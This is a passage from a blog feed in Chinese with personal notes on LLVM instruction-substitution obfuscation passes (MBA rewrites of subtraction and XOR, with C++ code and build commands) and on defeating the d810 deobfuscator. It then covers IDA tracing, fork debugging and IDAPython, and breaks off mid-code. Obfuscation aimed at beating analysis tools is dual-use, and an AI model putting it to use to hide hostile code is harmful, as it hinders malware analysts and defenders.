specified by I.   (将BI指定的指令替换为I指定的指令)\n</code></pre>\n<h5 id=\"run-method-which-returns-a-preservedanalyses实现\"><a class=\"markdownIt-Anchor\" href=\"#run-method-which-returns-a-preservedanalyses实现\">#</a> run () method which returns a PreservedAnalyses 实现</h5>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//--------------</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>PreservedAnalyses <span class=\"token class-name\">MBASub</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span>llvm<span class=\"token double-colon punctuation\">::</span>Function <span class=\"token operator\">&amp;</span>F<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                              llvm<span class=\"token double-colon punctuation\">::</span>FunctionAnalysisManager <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//ModulePass 需要这里是 llvm::Module 和 ModuleAnalysisManager，FunctionPass 需要这里是 Function 和 FunctionAnalysisManager</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">bool</span> Changed <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"HAHAHAHAHAHAHAHAHA MyPass Loaded\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> <span class=\"token operator\">&amp;</span>BB <span class=\"token operator\">:</span> F<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    Changed <span class=\"token operator\">|=</span> <span class=\"token function\">runOnBasicBlock</span><span class=\"token punctuation\">(</span>BB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>Changed <span class=\"token operator\">?</span> llvm<span class=\"token double-colon punctuation\">::</span><span class=\"token class-name\">PreservedAnalyses</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">none</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                  <span class=\"token operator\">:</span> llvm<span class=\"token double-colon punctuation\">::</span><span class=\"token class-name\">PreservedAnalyses</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//run 函数返回一个 PreservedAnalyses 结构表示哪些 Analysis Pass 的结果有变化。比如没有任何改变，可以返回 PreservedAnalyses::all () 表示保留全部分析结果；如果变化了，可以返回 PreservedAnalyses::none () 表示分析结果全部失效，需要重新计算。</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h5 id=\"mbasub实现\"><a class=\"markdownIt-Anchor\" href=\"#mbasub实现\">#</a> MBASub 实现</h5>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// MBASub 实现</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token class-name\">MBASub</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">runOnBasicBlock</span><span class=\"token punctuation\">(</span>BasicBlock <span class=\"token operator\">&amp;</span>BB<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">bool</span> Changed <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 在 LLVM 中，BasicBlock（基本块）是一个基本的控制流单元，它包含一系列按照程序的控制流路径顺序排列的指令。因此，在 LLVM 中，将基本块中的指令作为迭代器的元素是很自然的选择，因为基本块实际上就是一个指令序列</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">// 循环块中的所有指令。 替换指令需要迭代器</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> Inst <span class=\"token operator\">=</span> BB<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> IE <span class=\"token operator\">=</span> BB<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> Inst <span class=\"token operator\">!=</span> IE<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>Inst<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// 初始化了一个名为 Inst 的迭代器，指向基本块（BB）中的指令的起始位置</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">//IE = BB.end (): 这里初始化了另一个名为 IE 的迭代器，指向基本块中指令的结束位置</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 跳过非二元指令</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">auto</span> <span class=\"token operator\">*</span>BinOp <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">dyn_cast</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>BinaryOperator<span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>Inst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 在 LLVM 中，BinaryOperator 是表示二元操作符的一种特殊指令类型。它用于表示诸如加法、减法、乘法等二元操作的指令。BinaryOperator 继承自 Instruction 类，因此它是指令的一种</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>BinOp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">/// 跳过不是减法，或者不是整数的指令</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> Opcode <span class=\"token operator\">=</span> BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOpcode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Opcode <span class=\"token operator\">!=</span> Instruction<span class=\"token double-colon punctuation\">::</span>Sub <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">isIntegerTy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    IRBuilder<span class=\"token operator\">&lt;</span><span class=\"token operator\">></span> <span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 创建了一个 IRBuilder 对象，插入新的指令、操作数等到当前基本块所需的</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\">// Create  (a + ~b) + 1</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    Instruction <span class=\"token operator\">*</span>NewValue <span class=\"token operator\">=</span> <span class=\"token class-name\">BinaryOperator</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">CreateAdd</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateAdd</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                          Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateNot</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token class-name\">ConstantInt</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\">// 替换！</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">ReplaceInstWithInst</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>BB<span class=\"token punctuation\">,</span> Inst<span class=\"token punctuation\">,</span> NewValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    Changed <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">return</span> Changed<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>附混淆效果<img data-src=\"/images/image-20231214170831217.png\" alt=\"image-20231214170831217\"></p>\n<h4 id=\"mbaadd\"><a class=\"markdownIt-Anchor\" href=\"#mbaadd\">#</a> MBAAdd</h4>\n<p>(有点神了 这个指令替换 d810 解不了)</p>\n<p>见 github</p>\n<h4 id=\"xor\"><a class=\"markdownIt-Anchor\" href=\"#xor\">#</a> XOR</h4>\n<p>[{c1: c5/2, c2: -c5/2, c3: -c5/2, c4: -c5}]<br>\n 其中，c5 为任意非零常数</p>\n<p>得:</p>\n<p>x^y==x-y-2*(x|~y)-2</p>\n<p>MBAXor 实现</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// MBAXor 实现</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token class-name\">MBAXor</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">runOnBasicBlock</span><span class=\"token punctuation\">(</span>BasicBlock <span class=\"token operator\">&amp;</span>BB<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">bool</span> Changed <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> Inst <span class=\"token operator\">=</span> BB<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> IE <span class=\"token operator\">=</span> BB<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> Inst <span class=\"token operator\">!=</span> IE<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>Inst<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">auto</span> <span class=\"token operator\">*</span>BinOp <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">dyn_cast</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>BinaryOperator<span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>Inst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>BinOp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> Opcode <span class=\"token operator\">=</span> BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOpcode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Opcode <span class=\"token operator\">!=</span> Instruction<span class=\"token double-colon punctuation\">::</span>Xor <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">isIntegerTy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    IRBuilder<span class=\"token operator\">&lt;</span><span class=\"token operator\">></span> <span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> <span class=\"token keyword\">auto</span> Val2 <span class=\"token operator\">=</span> <span class=\"token class-name\">ConstantInt</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// 逐步拆解  x-y-2*(x|~y)-2 可变成 x-(y+(2*(x|~y)+2))</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    Instruction <span class=\"token operator\">*</span>NewValue <span class=\"token operator\">=</span> <span class=\"token class-name\">BinaryOperator</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">CreateSub</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateAdd</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                          Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateAdd</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                              Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateMul</span><span class=\"token punctuation\">(</span>Val2<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                                                Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateOr</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                                                    BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                                                    Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateNot</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                                                        BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>Val2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\">// 替换！</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token function\">ReplaceInstWithInst</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>BB<span class=\"token punctuation\">,</span> Inst<span class=\"token punctuation\">,</span> NewValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    Changed <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token keyword\">return</span> Changed<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>test.cpp</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">78</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">67</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">int</span> c <span class=\"token operator\">=</span> <span class=\"token number\">34</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">int</span> d <span class=\"token operator\">=</span> <span class=\"token number\">45</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> e <span class=\"token operator\">=</span> <span class=\"token number\">99</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> result <span class=\"token operator\">=</span> a <span class=\"token operator\">^</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    result <span class=\"token operator\">^=</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    result <span class=\"token operator\">^=</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    result <span class=\"token operator\">^=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    result <span class=\"token operator\">^=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The result of 5 XOR operations is: %d\\n\"</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a: %d\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b: %d\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c: %d\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"d: %d\\n\"</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"e: %d\\n\"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>/usr/lib/llvm-17/bin/opt -load-pass-plugin ./libMYXor.so -passes=“mba-xor” -S out.ll -o temp.ll</p>\n<p>clang-17 temp.ll -o temp# 得二进制文件</p>\n<h4 id=\"d810对抗相关\"><a class=\"markdownIt-Anchor\" href=\"#d810对抗相关\">#</a> d810 对抗相关</h4>\n<p>像 mbaadd 这种针对特定 byte 数据范围的 d810 默认自带的反混淆规则没有的式子可以，但找到这种式子就考验数学能力了…</p>\n<p><img data-src=\"/images/image-20231225235540039.png\" alt=\"image-20231225235540039\"></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/09/21/IDA%E6%93%8D%E4%BD%9C%E3%81%AE%E6%9C%9D%E8%8A%B1%E5%A4%95%E6%8B%BE/",
            "url": "https://3cly.github.io/2023/09/21/IDA%E6%93%8D%E4%BD%9C%E3%81%AE%E6%9C%9D%E8%8A%B1%E5%A4%95%E6%8B%BE/",
            "title": "IDA操作の朝花夕拾",
            "date_published": "2023-09-21T10:12:32.000Z",
            "content_html": "<h1 id=\"trace-分析\"><a class=\"markdownIt-Anchor\" href=\"#trace-分析\">#</a> Trace 分析</h1>\n<p>打开菜单项 [Debugger] -&gt; [Tracing] -&gt; [Tracing Options] 配置 Trace 选项<br>\n在准备开始 Trace 的指令位置设置断点，并使该断点命中<br>\n开启 Trace：[Debugger] -&gt; [Tracing] -&gt; [Instruction Tracing]<br>\n 开启后，单步执行一条指令，发现已经执行的指令变色表示开启 Trace 成功<br>\n按下 F9 继续运行，直到下一个断点手动停止 Trace 或直到程序结束</p>\n<p>指令级 Trace 记录每一条指令的执行情况</p>\n<p>基本块 trace</p>\n<p>函数级别 trace</p>\n<p>实操去混淆</p>\n<p>先在开头 start 下了一个断点</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230922145513874.png\" alt=\"image-20230922145513874\"></p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230922145547232.png\" alt=\"image-20230922145547232\"></p>\n<p>运行起来后即可 trace</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230922145742213.png\" alt=\"image-20230922145742213\"></p>\n<p>trace 会把执行过的指令染色 退出调试 能在 tracing window 分析 trace 的结果</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230922145842252.png\" alt=\"image-20230922145842252\"></p>\n<p>通过 trace 找到堆栈平衡点 就能确定花指令区间然后去除</p>\n<p>result 是当前指令执行后，被修改的寄存器列表及对应的值</p>\n<h1 id=\"fork-双进程调试\"><a class=\"markdownIt-Anchor\" href=\"#fork-双进程调试\">#</a> Fork 双进程调试</h1>\n<p>将子进程的第一条指令 patch 为死循环 (这样子进程就在死循环的等待状态)</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230922160814049.png\" alt=\"image-20230922160814049\"> 重新打开另外一个 IDA，附加子进程，恢复第一条指令，调试<br>\n (也可以 patch 成死循环后 detach 再重新 attach 子进程 然后 set IP 跳出死循环即可)</p>\n<p>当然，如果 fork 的进程与原进程不存在交互，也可以直接 set IP 执行子进程的代码来调试</p>\n<p>这个技巧适用于所有无法直接启动调试，而只能附加的场景</p>\n<h1 id=\"ida-python\"><a class=\"markdownIt-Anchor\" href=\"#ida-python\">#</a> IDA Python</h1>\n<p>寄存器操作</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>idc<span class=\"token punctuation\">.</span>get_reg_value<span class=\"token punctuation\">(</span>'rax’<span class=\"token punctuation\">)</span> <span class=\"token comment\">#读取</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>idaapi<span class=\"token punctuation\">.</span>set_reg_val<span class=\"token punctuation\">(</span><span class=\"token string\">\"rax\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1234</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置</span></pre></td></tr></table></figure><p>读取 xmm 寄存器 (很少遇到)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">read_xmm_reg</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>​       rv <span class=\"token operator\">=</span> idaapi<span class=\"token punctuation\">.</span>regval_t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 